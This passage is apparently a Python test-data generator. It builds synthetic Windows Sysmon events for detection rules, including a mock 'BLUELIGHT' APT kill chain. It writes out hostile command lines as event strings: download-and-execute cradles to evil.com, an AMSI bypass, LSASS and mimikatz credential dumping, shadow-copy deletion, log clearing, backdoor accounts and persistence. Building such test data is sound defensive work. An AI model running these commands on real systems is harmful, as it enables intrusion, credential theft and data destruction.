"""Auto-extracted from generate_test_logs.py — windows sysmon synthetic events.

Behavior-preserving split: function bodies are unchanged. Shared constants and
helpers live in ``testlogs.common`` and are imported via star import.
"""
import json
import ntpath
import os
import random
import re
import sys
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from testlogs.common import *  # noqa: F401,F403


def sysmon_event(event_id, image, command_line, host=None, user=None,
                 parent_image="C:\\Windows\\explorer.exe",
                 target_image=None, target_filename=None, target_object=None,
                 granted_access=None, dest_hostname=None, dest_ip=None,
                 pipe_name=None, msg=None, offset=0, **extra):
    """Generate a Windows Sysmon Event 1 style JSON event.

    Uses OCI Log Analytics field names (e.g. 'Process Name', 'Command Line')
    so that the Upload API auto-maps them to LA fields for query/dashboard use.
    Also retains Sysmon-native names (Image, CommandLine) for parser compatibility.
    """
    if host is None:
        host = random.choice(WINDOWS_HOSTS)
    if user is None:
        user = random.choice(WINDOWS_USERS)
    event_time = ts(offset)
    current_directory = ntpath.dirname(image) + "\\"
    original_name = ntpath.basename(image)
    parent_cmd = extra.pop("ParentCommandLine", ntpath.basename(parent_image))
    event = {
        # OCI Log Analytics mapped fields (used by OCL queries)
        "Event ID": event_id,
        "Process Name": image,
        "Command Line": command_line,
        "Parent Process Name": parent_image,
        "Parent Command Line": parent_cmd,
        "Host Name (Server)": host,
        "Original File Name": original_name,
        "Integrity Level": random.choice(["System", "High", "Medium"]),
        "Logon ID": hex(random.randint(0x3E4, 0xFFF)),
        "Terminal Session ID": random.choice([0, 1, 2, 3, 10]),
        # Sysmon-native fields (for raw reference / parser fallback)
        "EventID": event_id,
        "TimeCreated": event_time,
        "UtcTime": event_time,
        "Computer": host,
        "Channel": "Microsoft-Windows-Sysmon/Operational",
        "Provider": "Microsoft-Windows-Sysmon",
        "User": user,
        "ProcessId": random.randint(100, 9999),
        "ProcessGuid": windows_guid(),
        "Image": image,
        "CommandLine": command_line,
        "CurrentDirectory": current_directory,
        "FileVersion": "10.0.0.0",
        "Description": f"{original_name} process",
        "Product": "Microsoft Windows Operating System",
        "Company": "Microsoft Corporation",
        "OriginalFileName": original_name,
        "Hashes": (
            f"SHA1={(uuid.uuid4().hex + uuid.uuid4().hex)[:40].upper()},"
            f"MD5={uuid.uuid4().hex.upper()},"
            f"SHA256={(uuid.uuid4().hex + uuid.uuid4().hex)[:64].upper()}"
        ),
        "LogonGuid": windows_guid(),
        "LogonId": hex(random.randint(0x3E4, 0xFFF)),
        "TerminalSessionId": random.choice([0, 1, 2, 3, 10]),
        "IntegrityLevel": random.choice(["System", "High", "Medium"]),
        "ParentProcessGuid": windows_guid(),
        "ParentProcessId": random.randint(100, 9999),
        "ParentImage": parent_image,
        "ParentCommandLine": parent_cmd,
        "SourceImage": image,
        "TargetImage": target_image or "",
        "TargetFilename": target_filename or "",
        "TargetObject": target_object or "",
        "GrantedAccess": granted_access or "",
        "DestinationHostname": dest_hostname or "",
        "DestinationIp": dest_ip or "",
        "PipeName": pipe_name or "",
        # OCI LA mapped duplicates
        "Source Process": image,
        "Target Process": target_image or "",
        "Target Filename": target_filename or "",
        "Target Object": target_object or "",
        "Granted Access": granted_access or "",
        "Destination Hostname": dest_hostname or "",
        "Destination IP": dest_ip or "",
        "Pipe Name": pipe_name or "",
        "msg": msg or f"Sysmon event {event_id}: {ntpath.basename(image)}",
    }
    event.update(extra)
    return event


def _bluelight_kill_chain_sysmon_events():
    """Mirror of the kill-chain emitter into the SOC Windows Sysmon Logs source.

    The SOC Windows Sysmon parser has a longer-established field set, so emitting
    the same scenarios here gives the per-widget detections two routes to match —
    important when the Sysmon Operational parser's freshly-registered fields
    have not yet propagated.
    """
    events = []
    apt_host = "WS01.sevenkingdoms.local"
    apt_user = "joffrey"
    apt_image = "C:\\Users\\Public\\bluelight.exe"
    iexplore = "C:\\Program Files\\Internet Explorer\\iexplore.exe"
    powershell = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    cmd = "C:\\Windows\\System32\\cmd.exe"
    base = 1000

    file_discovery_cmds = [
        ("dir /s /b C:\\Users\\joffrey\\Documents", iexplore, cmd),
        ("dir /s C:\\Users\\joffrey\\Desktop\\*.docx", iexplore, cmd),
        ("powershell -Command Get-ChildItem -Recurse -Path C:\\Users -Filter *.pdf",
         iexplore, powershell),
        ("tree C:\\Users\\joffrey /F", "C:\\Windows\\System32\\wscript.exe", cmd),
    ]
    for i, (cl, parent, image) in enumerate(file_discovery_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cl,
            parent_image=parent, host=apt_host, user=apt_user,
            msg="BLUELIGHT: file discovery from browser child",
            offset=base + i,
        ))

    sec_paths = [
        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend",
        "HKLM\\SOFTWARE\\Microsoft\\Security Center\\SecurityCenter2",
        "HKLM\\SOFTWARE\\Windows Defender\\Exclusions",
        "HKLM\\SOFTWARE\\AVAST Software\\Avast",
        "HKLM\\SOFTWARE\\ESET\\ESET Security",
        "HKLM\\SOFTWARE\\KasperskyLab\\AVP",
    ]
    for i, target in enumerate(sec_paths):
        events.append(sysmon_event(
            event_id=12 + (i % 3), image=apt_image, command_line="",
            parent_image=apt_image, host=apt_host, user=apt_user,
            target_object=target,
            msg="BLUELIGHT: registry enumeration of security products",
            offset=base + 50 + i,
        ))

    yara_pdb_cmds = [
        "C:\\Development\\BACKDOOR\\ncov\\Release\\bluelight.pdb",
        "powershell -Command Get-Content C:\\Users\\Public\\Release\\bluelight.pdb",
    ]
    for i, cl in enumerate(yara_pdb_cmds):
        events.append(sysmon_event(
            event_id=1, image=apt_image, command_line=cl,
            parent_image=cmd, host=apt_host, user=apt_user,
            msg="BLUELIGHT YARA: PDB path indicator",
            offset=base + 100 + i,
        ))
    events.append(sysmon_event(
        event_id=11, image=apt_image, command_line="",
        parent_image=apt_image, host=apt_host, user=apt_user,
        target_filename="C:\\Users\\Public\\BACKDOOR\\ncov\\bluelight.pdb",
        msg="BLUELIGHT YARA: PDB file write",
        offset=base + 110,
    ))

    yara_recon_cmds = [
        'curl https://ipinfo.io/json',
        'powershell -Command Invoke-WebRequest -Uri https://ipinfo.io',
        'cmd /c echo {"UserName":"joffrey","ComName":"WS01","OnlineIP":"203.0.113.10","LocalIP":"10.0.1.10","AntiVirus":"Windows Defender","Process Level":"Medium","VM":"false"}',
    ]
    for i, cl in enumerate(yara_recon_cmds):
        events.append(sysmon_event(
            event_id=1,
            image=apt_image if i == 2 else powershell,
            command_line=cl,
            parent_image=apt_image, host=apt_host, user=apt_user,
            msg="BLUELIGHT YARA: system reconnaissance JSON",
            offset=base + 130 + i,
        ))

    yara_cookie_cmds = [
        'powershell -Command "cookie_name: OSID, cookie_name: SID, __Secure-3PSID"',
        'cmd /c echo cookie_name: __Secure-3PSID',
        'powershell -Command "Failed to get chrome cookie"',
        'powershell -Command "Failed to get Edge cookie database"',
        'cmd /c echo GM_ACTION_TOKEN=abc GM_ID_KEY=xyz',
        'cmd /c echo mail/u/0/?ik=abc Success to enable imap',
        'cmd /c echo Success to enable thunder access',
    ]
    for i, cl in enumerate(yara_cookie_cmds):
        events.append(sysmon_event(
            event_id=1, image=apt_image, command_line=cl,
            parent_image=apt_image, host=apt_host, user=apt_user,
            msg="BLUELIGHT YARA: chrome/edge cookie theft",
            offset=base + 150 + i,
        ))

    keylog_files = [
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\cheV01.dat",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\INTEG.RAW",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\keylog.dat",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\keylog.log",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\edb.chk",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\edb.log",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\edbres00001.jrs",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\edbres00002.jrs",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\edbtmp.log",
    ]
    for i, path in enumerate(keylog_files):
        events.append(sysmon_event(
            event_id=11, image=apt_image, command_line="",
            parent_image=apt_image, host=apt_host, user=apt_user,
            target_filename=path,
            msg="BLUELIGHT YARA: keylogger staging",
            offset=base + 200 + i,
        ))

    yara_google_cmds = [
        'cmd /c echo Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5',
        'cmd /c echo User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:80.0) Gecko/20100101 Firefox/80.0',
        'cmd /c echo AccountSettingsUi/data/batchexecute SNlM0e BqLdsd token',
    ]
    for i, cl in enumerate(yara_google_cmds):
        events.append(sysmon_event(
            event_id=1, image=apt_image, command_line=cl,
            parent_image=apt_image, host=apt_host, user=apt_user,
            msg="BLUELIGHT YARA: Google App C2 indicator",
            offset=base + 230 + i,
        ))

    ingress_files = [
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\stage2.exe",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\loader.dll",
        "C:\\Users\\Public\\AppData\\Roaming\\update.scr",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\runner.bat",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\stager.ps1",
    ]
    for i, path in enumerate(ingress_files):
        events.append(sysmon_event(
            event_id=11, image=apt_image, command_line="",
            parent_image=apt_image, host=apt_host, user=apt_user,
            target_filename=path,
            msg="BLUELIGHT: ingress tool transfer",
            offset=base + 260 + i,
        ))

    wmi_cmds = [
        "powershell -Command Get-WmiObject -Class Win32_ComputerSystem",
        "powershell -Command Get-CimInstance -ClassName Win32_OperatingSystem",
        "wmic.exe path Win32_Processor get Name",
        "wmic.exe path Win32_NetworkAdapterConfiguration get IPAddress",
    ]
    for i, cl in enumerate(wmi_cmds):
        events.append(sysmon_event(
            event_id=1,
            image=powershell if "powershell" in cl else "C:\\Windows\\System32\\wbem\\wmic.exe",
            command_line=cl,
            parent_image=iexplore, host=apt_host, user=apt_user,
            msg="BLUELIGHT: WMI system enumeration from browser child",
            offset=base + 300 + i,
        ))

    child_proc_set = [
        ("cmd.exe /c whoami", cmd),
        ("powershell.exe -NoProfile -Command Get-Process", powershell),
        ("wscript.exe C:\\Users\\Public\\loader.vbs", "C:\\Windows\\System32\\wscript.exe"),
        ("mshta.exe http://203.0.113.20/payload.hta", "C:\\Windows\\System32\\mshta.exe"),
        ("cscript.exe //e:vbs C:\\Users\\Public\\dropper.vbs", "C:\\Windows\\System32\\cscript.exe"),
        ("rundll32.exe C:\\Users\\Public\\stage.dll,RunMain", "C:\\Windows\\System32\\rundll32.exe"),
    ]
    for i, (cl, image) in enumerate(child_proc_set):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cl,
            parent_image=iexplore, host=apt_host, user=apt_user,
            msg="BLUELIGHT: browser spawning suspicious child process",
            offset=base + 330 + i,
        ))

    for i, browser in enumerate([
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
        "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        "C:\\Program Files\\Internet Explorer\\iexplore.exe",
    ]):
        events.append(sysmon_event(
            event_id=10, image=apt_image, command_line="",
            parent_image=apt_image, host=apt_host, user=apt_user,
            target_image=browser, granted_access="0x1fffff",
            msg=f"BLUELIGHT browser credential access: {ntpath.basename(browser)}",
            offset=base + 360 + i,
        ))

    return events


def generate_windows_events():
    """Generate Windows Sysmon events covering all 24 Windows rules."""
    events = []

    # ── LOLBins (20 rules) ──
    lolbins = {
        "at.exe": "at 12:00 /every:M,T,W,Th,F C:\\Temp\\payload.exe",
        "bitsadmin.exe": "bitsadmin /transfer myJob /download http://evil.com/payload.exe C:\\Temp\\payload.exe",
        "certutil.exe": "certutil -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\payload.exe",
        "cmd.exe": "cmd.exe /c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1')",
        "cscript.exe": "cscript.exe C:\\Temp\\evil.vbs",
        "ipconfig.exe": "ipconfig /all",
        "mshta.exe": "mshta.exe http://evil.com/payload.hta",
        "net.exe": "net user backdoor P@ssw0rd /add",
        "net1.exe": "net1 user backdoor P@ssw0rd /add",
        "powershell.exe": "powershell.exe -ep bypass -nop -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1')",
        "regsvr32.exe": "regsvr32.exe /s /n /u /i:http://evil.com/file.sct scrobj.dll",
        "rundll32.exe": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"",
        "sc.exe": "sc create evilsvc binPath= C:\\Temp\\backdoor.exe start= auto",
        "schtasks.exe": "schtasks /create /sc minute /mo 5 /tn EvilTask /tr C:\\Temp\\payload.exe",
        "systeminfo.exe": "systeminfo",
        "taskkill.exe": "taskkill /F /IM defender.exe",
        "tasklist.exe": "tasklist /svc",
        "whoami.exe": "whoami /all",
        "wmic.exe": "wmic process call create 'C:\\Temp\\payload.exe'",
        "wscript.exe": "wscript.exe C:\\Temp\\evil.vbs",
    }
    for i, (binary, cmd) in enumerate(lolbins.items()):
        for j in range(2):
            events.append(sysmon_event(
                event_id=1,
                image=f"C:\\Windows\\System32\\{binary}",
                command_line=cmd,
                parent_image="C:\\Windows\\System32\\cmd.exe",
                offset=i*3+j,
            ))

    bluelight_sequences = [
        (
            "C:\\Windows\\System32\\cmd.exe",
            "cmd.exe /c powershell.exe -NoProfile -Command Get-WmiObject Win32_ComputerSystem",
            "C:\\Program Files\\Internet Explorer\\iexplore.exe",
            180,
        ),
        (
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -NoProfile -Command [Convert]::FromBase64String('QQBDAFQA')",
            "C:\\Program Files\\Internet Explorer\\iexplore.exe",
            181,
        ),
    ]
    for image, command_line, parent_image, offset in bluelight_sequences:
        events.append(sysmon_event(
            event_id=1,
            image=image,
            command_line=command_line,
            parent_image=parent_image,
            host="WS01.sevenkingdoms.local",
            user="joffrey",
            offset=offset,
        ))

    # ── Certutil Download/Decode (new rule) ──
    certutil_cmds = [
        "certutil -urlcache -split -f http://malware.example.com/payload.exe C:\\Temp\\payload.exe",
        "certutil -decode C:\\Temp\\encoded.b64 C:\\Temp\\malware.exe",
        "certutil -decodehex C:\\Temp\\hex.txt C:\\Temp\\binary.exe",
    ]
    for i, cmd in enumerate(certutil_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\certutil.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=200+i,
        ))

    # ── Encoded PowerShell Execution (new rule) ──
    ps_cmds = [
        "powershell.exe -NoProfile -NonInteractive -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA=",
        "powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
        "powershell.exe -e SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQ==",
        "powershell.exe -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsA",
    ]
    for i, cmd in enumerate(ps_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=210+i,
        ))

    # ── Service Creation via SC (new rule) ──
    sc_cmds = [
        'sc create evilsvc binPath= "C:\\Temp\\backdoor.exe" start= auto',
        'sc.exe create persistence binPath= C:\\Windows\\Temp\\svc.exe',
    ]
    for i, cmd in enumerate(sc_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\sc.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            user="NT AUTHORITY\\SYSTEM",
            offset=220+i,
        ))

    # ── Credential Dumping via Procdump (new rule) ──
    # sel1: procdump + lsass
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Tools\\procdump.exe",
        command_line="procdump.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=230,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Tools\\procdump64.exe",
        command_line="procdump64.exe -accepteula -ma lsass.exe out.dmp",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=231,
    ))
    # sel2: any process writing lsass.dmp
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Tools\\dumper.exe",
        command_line="C:\\Tools\\dumper.exe --output lsass.dmp",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=232,
    ))

    # ═══════════════════════════════════════════════════════════════
    #  NEW: Advanced Windows Attack Patterns
    # ═══════════════════════════════════════════════════════════════

    # ── Shadow Copy Deletion (Ransomware) ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\vssadmin.exe",
        command_line="vssadmin.exe delete shadows /all /quiet",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=300,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\vssadmin.exe",
        command_line="vssadmin Delete Shadows /for=C: /all",
        parent_image="C:\\malware\\ransomware.exe",
        offset=301,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\wbem\\wmic.exe",
        command_line="wmic shadowcopy delete",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=302,
    ))

    # ── AMSI Bypass ──
    amsi_cmds = [
        "powershell.exe -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        "powershell.exe -c $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$a.GetField('amsiContext','NonPublic,Static')",
        "powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://evil.com/amsi.dll')",
    ]
    for i, cmd in enumerate(amsi_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=310+i,
        ))

    # ── WMI Persistence ──
    wmi_cmds = [
        "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name='EvilFilter', EventNamespace='root\\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent'",
        "powershell.exe Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{Name='EvilConsumer';CommandLineTemplate='C:\\Temp\\payload.exe'}",
        "powershell.exe Register-WmiEvent -Namespace root\\cimv2 -Query 'SELECT * FROM Win32_ProcessStartTrace' -Action {C:\\Temp\\payload.exe}",
        "powershell.exe New-CimInstance -ClassName __FilterToConsumerBinding -Namespace root\\subscription",
    ]
    for i, cmd in enumerate(wmi_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" if "powershell" in cmd.lower() else "C:\\Windows\\System32\\wbem\\wmic.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=320+i,
        ))

    # ── Registry Run Key Modification ──
    reg_cmds = [
        'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v EvilPersistence /t REG_SZ /d "C:\\Temp\\backdoor.exe" /f',
        'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v Updater /t REG_SZ /d "C:\\Temp\\payload.exe" /f',
        'powershell.exe New-ItemProperty -Path "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name Evil -Value "C:\\Temp\\evil.exe"',
    ]
    for i, cmd in enumerate(reg_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\reg.exe" if cmd.startswith("reg") else "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=330+i,
        ))

    # ── DLL Side-Loading from Suspicious Path ──
    sideload_cmds = [
        ("C:\\Windows\\System32\\rundll32.exe", "rundll32.exe C:\\Users\\Public\\evil.dll,DllMain"),
        ("C:\\Windows\\System32\\regsvr32.exe", "regsvr32.exe /s C:\\Users\\analyst\\AppData\\Local\\Temp\\malware.dll"),
        ("C:\\Windows\\System32\\msiexec.exe", "msiexec.exe /i C:\\Users\\analyst\\Downloads\\trojan.msi /quiet"),
    ]
    for i, (image, cmd) in enumerate(sideload_cmds):
        events.append(sysmon_event(
            event_id=1,
            image=image,
            command_line=cmd,
            parent_image="C:\\Windows\\explorer.exe",
            offset=340+i,
        ))

    # ── BCDEdit Recovery Disable (Ransomware) ──
    bcd_cmds = [
        "bcdedit.exe /set {default} recoveryenabled no",
        "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures",
    ]
    for i, cmd in enumerate(bcd_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\bcdedit.exe",
            command_line=cmd,
            parent_image="C:\\malware\\ransomware.exe",
            offset=350+i,
        ))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 2): Additional Windows Attack Patterns
    # ═══════════════════════════════════════════════════════════════

    # ── Mimikatz Execution Patterns ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Temp\\mimikatz.exe",
        command_line="mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=400,
    ))
    mimikatz_cmdlines = [
        "C:\\Tools\\mimi.exe sekurlsa::wdigest",
        "C:\\Tools\\procdump.exe lsadump::sam",
        "powershell.exe lsadump::dcsync /domain:corp.local /user:krbtgt",
        "C:\\Temp\\katz.exe privilege::debug token::elevate",
    ]
    for i, cmd in enumerate(mimikatz_cmdlines):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Temp\\mimikatz.exe" if "mimi" in cmd or "katz" in cmd else "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            host="DC01.corp.local",
            offset=401+i,
        ))

    # ── Firewall Rule Modification ──
    fw_cmds = [
        "netsh advfirewall firewall add rule name=EvilRule dir=in action=allow protocol=tcp localport=4444",
        "netsh advfirewall set allprofiles state off",
        "netsh advfirewall firewall delete rule name=WindowsDefenderFirewall",
    ]
    for i, cmd in enumerate(fw_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\netsh.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=410+i,
        ))

    # ── RDP Lateral Movement ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\mstsc.exe",
        command_line="mstsc.exe /v:192.168.1.50",
        parent_image="C:\\Windows\\explorer.exe",
        offset=420,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\mstsc.exe",
        command_line="mstsc.exe /v:DC01.corp.local /admin",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=421,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\reg.exe",
        command_line='reg add "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=422,
    ))

    # ── Scheduled Task Creation via Schtasks ──
    schtask_cmds = [
        "schtasks.exe /create /sc minute /mo 5 /tn PersistTask /tr C:\\Temp\\backdoor.exe /ru SYSTEM",
        "schtasks /create /tn Updater /tr C:\\Windows\\Temp\\svc.exe /sc onlogon",
    ]
    for i, cmd in enumerate(schtask_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\schtasks.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=430+i,
        ))

    # ── PowerShell Download Cradle ──
    ps_download_cmds = [
        ("powershell.exe", "powershell.exe -c Invoke-WebRequest -Uri http://evil.com/payload.exe -OutFile C:\\Temp\\payload.exe"),
        ("powershell.exe", "powershell.exe -c (New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1') | IEX"),
        ("pwsh.exe", "pwsh.exe -c (New-Object Net.WebClient).DownloadFile('http://evil.com/payload.exe','C:\\Temp\\p.exe')"),
        ("powershell.exe", "powershell.exe Start-BitsTransfer -Source http://evil.com/payload.exe -Destination C:\\Temp\\payload.exe"),
        ("powershell.exe", "powershell.exe Invoke-RestMethod -Uri http://evil.com/api/config | IEX"),
    ]
    for i, (binary, cmd) in enumerate(ps_download_cmds):
        events.append(sysmon_event(
            event_id=1,
            image=f"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\{binary}" if binary == "powershell.exe" else f"C:\\Program Files\\PowerShell\\7\\{binary}",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=440+i,
        ))

    # ── LSASS Memory Access via comsvcs.dll ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\rundll32.exe",
        command_line="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\Temp\\lsass.dmp full",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=450,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\rundll32.exe",
        command_line="rundll32.exe comsvcs.dll MiniDump (Get-Process lsass).Id C:\\Temp\\out.dmp full",
        parent_image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        host="DC01.corp.local",
        offset=451,
    ))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 3): Advanced Windows Detection Patterns
    # ═══════════════════════════════════════════════════════════════

    # ── Event Log Clearing ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\wevtutil.exe",
        command_line="wevtutil.exe cl Security",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=500,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\wevtutil.exe",
        command_line="wevtutil cl System",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=501,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe Clear-EventLog -LogName Security",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=502,
    ))

    # ── PsExec Remote Execution ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Tools\\PsExec.exe",
        command_line="psexec.exe \\\\DC01 -accepteula -s cmd.exe",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=510,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Tools\\PsExec64.exe",
        command_line="psexec64.exe \\\\192.168.1.50 -accepteula -u admin -p P@ss cmd /c whoami",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=511,
    ))

    # ── UAC Bypass ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\fodhelper.exe",
        command_line="fodhelper.exe",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=520,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\eventvwr.exe",
        command_line="eventvwr.exe",
        parent_image="C:\\Temp\\malware.exe",
        offset=521,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\sdclt.exe",
        command_line="sdclt.exe /kickoffelev",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=522,
    ))

    # ── Kerberoasting ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Temp\\Rubeus.exe",
        command_line="Rubeus.exe kerberoast /outfile:hashes.txt",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=530,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe Invoke-Kerberoast -OutputFormat Hashcat | Out-File hashes.txt",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=531,
    ))

    # ── BITS Job Persistence ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\bitsadmin.exe",
        command_line="bitsadmin /SetNotifyCmdLine PersistJob C:\\Temp\\backdoor.exe NULL",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=540,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\bitsadmin.exe",
        command_line="bitsadmin /AddFile DownloadJob http://evil.com/payload.exe C:\\Temp\\payload.exe",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=541,
    ))

    # ── MSBuild Code Execution ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
        command_line="MSBuild.exe C:\\Temp\\payload.csproj",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=550,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe",
        command_line="MSBuild.exe C:\\Users\\Public\\inline.xml",
